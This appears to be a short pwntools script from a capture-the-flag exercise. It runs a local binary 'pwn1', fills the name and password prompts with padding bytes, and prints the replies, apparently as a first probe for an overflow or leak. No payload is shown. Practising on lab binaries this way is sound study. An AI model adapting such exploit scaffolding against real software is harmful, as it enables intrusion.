from pwn import *
from LibcSearcher import *

p=process('./pwn1')
elf=ELF('./pwn1')
p.recvuntil(b'name:   ')
p.send(b'a'*0x20)
print(p.recvuntil(b'password:   '))
p.send(b'b'*0x10)
print(p.recv())
